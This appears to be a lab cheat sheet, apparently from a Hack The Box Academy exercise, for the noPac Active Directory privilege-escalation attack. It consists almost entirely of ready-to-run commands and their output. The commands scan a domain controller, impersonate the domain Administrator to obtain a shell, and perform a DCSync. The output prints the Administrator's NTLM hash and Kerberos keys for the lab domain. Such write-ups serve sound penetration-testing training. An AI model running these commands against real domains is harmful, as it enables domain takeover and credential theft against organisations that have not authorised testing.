# NOPAC

## [Enumeration](https://github.com/Ridter/noPac/blob/main/scanner.py)

```sh
htb-student@ea-attack01:~$ scanner.py 'INLANEFREIGHT.LOCAL'/'forend':'Klmcargo2' -use-ldap -dc-ip 172.16.5.5
```

```output title="Output" hl_lines="9"
███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████



[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

## Getting a Shell

```sh
htb-student@ea-attack01:~$ noPac.py 'INLANEFREIGHT.LOCAL'/'forend':'Klmcargo2' -use-ldap -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate Administrator -shell
```

## DCSync

```sh
htb-student@ea-attack01:~$ noPac.py 'INLANEFREIGHT.LOCAL'/'forend':'Klmcargo2' -use-ldap -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate Administrator -dump -just-dc-user INLANEFREIGHT/Administrator
```

```output title="Output" hl_lines="32 34-36"
███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████



[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat Administrator
[*] Adding Computer Account "WIN-FKIL6VRXZ2A$"
[*] MachineAccount "WIN-FKIL6VRXZ2A$" password = abWZBIgO)#V0
[*] Successfully added machine account WIN-FKIL6VRXZ2A$ with password abWZBIgO)#V0.
[*] WIN-FKIL6VRXZ2A$ object = CN=WIN-FKIL6VRXZ2A,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-FKIL6VRXZ2A$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-FKIL6VRXZ2A$
[*] Restored WIN-FKIL6VRXZ2A$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*] Saving ticket in Administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-FKIL6VRXZ2A$
[-] Delete computer WIN-FKIL6VRXZ2A$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
```
